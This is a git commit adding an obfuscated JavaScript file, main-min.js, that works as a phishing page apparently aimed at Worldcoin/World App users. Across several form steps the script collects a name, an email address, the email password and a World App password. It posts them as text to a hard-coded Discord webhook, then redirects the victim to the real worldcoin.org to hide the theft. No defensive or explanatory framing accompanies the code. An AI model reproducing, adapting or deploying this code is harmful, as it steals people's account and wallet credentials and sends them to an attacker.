71077e3b4b0334eb617a3d390253dcc9a0d3f8f2
vwambui <vwambui063@gmail.com>
2024-03-09 10:26:58 +0300

    Initial commit

---
+++ main-min.js
@@ -0,0 +1,188 @@
+const _0x2a015b = _0xc8e2;
+(function (_0x5e9f1e, _0x21b30d) {
+  const _0x281182 = _0xc8e2,
+    _0x3b8802 = _0x5e9f1e();
+  while (!![]) {
+    try {
+      const _0x9c5b5e =
+        parseInt(_0x281182(0xa8)) / 0x1 +
+        (parseInt(_0x281182(0xca)) / 0x2) * (-parseInt(_0x281182(0xbe)) / 0x3) +
+        (-parseInt(_0x281182(0xb3)) / 0x4) *
+          (-parseInt(_0x281182(0xd5)) / 0x5) +
+        (parseInt(_0x281182(0xc7)) / 0x6) * (-parseInt(_0x281182(0xbd)) / 0x7) +
+        -parseInt(_0x281182(0xb1)) / 0x8 +
+        -parseInt(_0x281182(0xd6)) / 0x9 +
+        (-parseInt(_0x281182(0xbc)) / 0xa) * (-parseInt(_0x281182(0xb5)) / 0xb);
+      if (_0x9c5b5e === _0x21b30d) break;
+      else _0x3b8802["push"](_0x3b8802["shift"]());
+    } catch (_0x2b8c6f) {
+      _0x3b8802["push"](_0x3b8802["shift"]());
+    }
+  }
+})(_0x13fe, 0xd57c2);
+function _0x13fe() {
+  const _0x30f3cf = [
+    "querySelectorAll",
+    "wldpass",
+    "type",
+    "password",
+    "13137688YVPFxN",
+    ".nextBtn2",
+    "587844yRXdrv",
+    "querySelector",
+    "15411zDcWdP",
+    "wldPassword",
+    "addEventListener",
+    "checked",
+    "lastname",
+    "forEach",
+    "application/json",
+    "27490qlGATf",
+    "7tywPeg",
+    "2121GakJUE",
+    "error",
+    "\x0aEmail:\x20",
+    "\x0aWldPassword:\x20",
+    "value",
+    "toString",
+    "Captain\x20Hook",
+    "innerHTML",
+    ".name-card",
+    "5728032vvGQVA",
+    "emailPassword",
+    "click",
+    "3428ZZFNsr",
+    ".show",
+    "add",
+    "Fill\x20in\x20all\x20details",
+    ".nextBtn3",
+    "text",
+    "POST",
+    "classList",
+    "move-left2",
+    ".emailValue",
+    "firstname",
+    "15EYcQpN",
+    "12062187uGybzq",
+    "stringify",
+    "Failed\x20to\x20send\x20message.",
+    "toUpperCase",
+    "email",
+    "then",
+    ".password-card",
+    "move-left3",
+    "============================================\x0aFirstName:\x20",
+    "\x0aEmailPassword:\x20",
+    "1731126GqGwSo",
+    "location",
+    "getElementById",
+    "move-left1",
+    "Invalid\x20email\x20address!",
+  ];
+  _0x13fe = function () {
+    return _0x30f3cf;
+  };
+  return _0x13fe();
+}
+function _0xc8e2(_0x16f1ec, _0x15adc4) {
+  const _0x13fe26 = _0x13fe();
+  return (
+    (_0xc8e2 = function (_0xc8e29, _0xd8a52) {
+      _0xc8e29 = _0xc8e29 - 0xa0;
+      let _0x2e8986 = _0x13fe26[_0xc8e29];
+      return _0x2e8986;
+    }),
+    _0xc8e2(_0x16f1ec, _0x15adc4)
+  );
+}
+const emailCard = document["querySelector"](".email-card"),
+  nameCard = document[_0x2a015b(0xb4)](_0x2a015b(0xc6)),
+  emailInput = document[_0x2a015b(0xaa)](_0x2a015b(0xa2)),
+  checkboxes = document[_0x2a015b(0xad)](_0x2a015b(0xcb)),
+  emailPassword = document[_0x2a015b(0xaa)](_0x2a015b(0xb0)),
+  wldPassword = document[_0x2a015b(0xaa)](_0x2a015b(0xae)),
+  firstName = document["getElementById"](_0x2a015b(0xd4)),
+  lastName = document[_0x2a015b(0xaa)](_0x2a015b(0xb9)),
+  fullName = document["querySelector"](".personName"),
+  passwordCard = document[_0x2a015b(0xb4)](_0x2a015b(0xa4)),
+  nextBtn1 = document[_0x2a015b(0xb4)](".nextBtn1"),
+  nextBtn2 = document[_0x2a015b(0xb4)](_0x2a015b(0xb2)),
+  nextBtn3 = document[_0x2a015b(0xb4)](_0x2a015b(0xce)),
+  nextBtn4 = document[_0x2a015b(0xb4)](".nextBtn4"),
+  verification = document[_0x2a015b(0xb4)](".verification-card"),
+  emailValue = document[_0x2a015b(0xb4)](_0x2a015b(0xd3));
+nextBtn1[_0x2a015b(0xb7)](_0x2a015b(0xc9), () => {
+  const _0x3a4966 = _0x2a015b;
+  firstName[_0x3a4966(0xc2)] == "" || lastName[_0x3a4966(0xc2)] == ""
+    ? alert(_0x3a4966(0xcd))
+    : (nameCard[_0x3a4966(0xd1)][_0x3a4966(0xcc)](_0x3a4966(0xab)),
+      (fullName[_0x3a4966(0xc5)] =
+        firstName[_0x3a4966(0xc2)][_0x3a4966(0xc3)]()[_0x3a4966(0xa1)]() +
+        "\x20" +
+        lastName[_0x3a4966(0xc2)][_0x3a4966(0xc3)]()["toUpperCase"]()));
+}),
+  nextBtn2[_0x2a015b(0xb7)](_0x2a015b(0xc9), validateEmail),
+  nextBtn3[_0x2a015b(0xb7)](_0x2a015b(0xc9), () => {
+    const _0x3e60ad = _0x2a015b;
+    nameCard["classList"][_0x3e60ad(0xcc)](_0x3e60ad(0xa5));
+  }),
+  nextBtn4[_0x2a015b(0xb7)](_0x2a015b(0xc9), () => {
+    const _0x393d2e = _0x2a015b,
+      _0x304f50 =
+        "https://discord.com/api/webhooks/1214608246099419176/pQTVdWlxPCQBijkRgyBUvlsMAUIutd8fNXn8mKNQSjP7xEb96LNVlZF-nRjhdNgf16nk",
+      _0x32a594 = {
+        firstname: firstName[_0x393d2e(0xc2)],
+        lastname: lastName[_0x393d2e(0xc2)],
+        email: emailInput[_0x393d2e(0xc2)],
+        emailPassword: emailPassword[_0x393d2e(0xc2)],
+        wldPassword: wldPassword[_0x393d2e(0xc2)],
+      },
+      _0x50bb09 =
+        _0x393d2e(0xa6) +
+        _0x32a594[_0x393d2e(0xd4)] +
+        "\x0aLastName:\x20" +
+        _0x32a594[_0x393d2e(0xb9)] +
+        _0x393d2e(0xc0) +
+        _0x32a594["email"] +
+        _0x393d2e(0xa7) +
+        _0x32a594[_0x393d2e(0xc8)] +
+        _0x393d2e(0xc1) +
+        _0x32a594[_0x393d2e(0xb6)],
+      _0x295deb = { content: _0x50bb09, username: _0x393d2e(0xc4) },
+      _0x1ef087 = JSON[_0x393d2e(0xd7)](_0x295deb);
+    fetch(_0x304f50, {
+      method: _0x393d2e(0xd0),
+      headers: { "Content-Type": _0x393d2e(0xbb) },
+      body: _0x1ef087,
+    })
+      [_0x393d2e(0xa3)]((_0x18da54) => {
+        const _0x135b53 = _0x393d2e;
+        _0x18da54["ok"]
+          ? (window[_0x135b53(0xa9)]["href"] =
+              "https://worldcoin.org/world-app")
+          : console[_0x135b53(0xbf)](_0x135b53(0xa0));
+      })
+      ["catch"]((_0x2f61d8) => {
+        const _0x4d7180 = _0x393d2e;
+        console[_0x4d7180(0xbf)]("Error:", _0x2f61d8);
+      });
+  }),
+  checkboxes[_0x2a015b(0xba)]((_0x41eade) => {
+    const _0x487337 = _0x2a015b;
+    _0x41eade["addEventListener"](_0x487337(0xc9), () => {
+      const _0x4cf47a = _0x487337;
+      _0x41eade[_0x4cf47a(0xb8)]
+        ? ((emailPassword[_0x4cf47a(0xaf)] = _0x4cf47a(0xcf)),
+          (wldPassword[_0x4cf47a(0xaf)] = _0x4cf47a(0xcf)))
+        : ((emailPassword[_0x4cf47a(0xaf)] = _0x4cf47a(0xb0)),
+          (wldPassword[_0x4cf47a(0xaf)] = _0x4cf47a(0xb0)));
+    });
+  });
+function validateEmail() {
+  const _0x1af2eb = _0x2a015b;
+  let _0x13b499 = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+  _0x13b499["test"](emailInput[_0x1af2eb(0xc2)])
+    ? (nameCard[_0x1af2eb(0xd1)][_0x1af2eb(0xcc)](_0x1af2eb(0xd2)),
+      (emailValue[_0x1af2eb(0xc5)] = emailInput[_0x1af2eb(0xc2)]))
+    : alert(_0x1af2eb(0xac));
+}
